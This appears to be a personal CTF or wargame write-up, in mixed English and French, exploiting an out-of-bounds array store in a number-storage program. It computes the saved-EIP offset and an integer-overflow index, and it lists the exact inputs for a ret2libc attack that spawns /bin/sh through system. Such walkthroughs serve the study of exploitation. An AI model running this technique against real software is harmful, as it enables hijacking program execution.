we can see a program meant to write an input number at an index
in memory. Idea is to use an index bigger than max data size to 
rewrite into stack and take control of program execution


so the program stores niumbers in an array of 100 words = 400 bytes


j ai l impression que quand on met un index plus grand que 100, il necrit pas
dans la memoire
si ca a l air de marcher, maintenant essayons de detruire l saved_eip du main

saved_eip at 0xffffd70c
start tab at $esp+0x24 = 0xffffd544

0xffffd70c-0xffffd544 = 456

0xf7e45513

saved_eip = pointeur sur stack vers adr  de retour qui sera prise par saved_eip quand main ret
saved_eip = (data + x << 2) % 2 ^ 32 ==> x = (2^32 - data + saved_eip) >> 2
            == 1073741938

on va exec un ret 2 libc 

addresse systeme = (gdb) p system
dans notre cas   = 0xf7e6aed0

on va mettre motre bin/sh dans le fgets d input de commande pusiu on a 20 - 5 de place


0xffffd6d8 + "store" = 0xffffd6dd

run puis

command:store
number: 4160264172
index: 116

en fait ici on utilise pas de int avec le byteshift car on tombe sur un mul de 3


command: store/bin/sh
number: 4159090384
index: 1073741938 

et la c est l inverse, sans byteshift on a un multiple de 3

command: quit

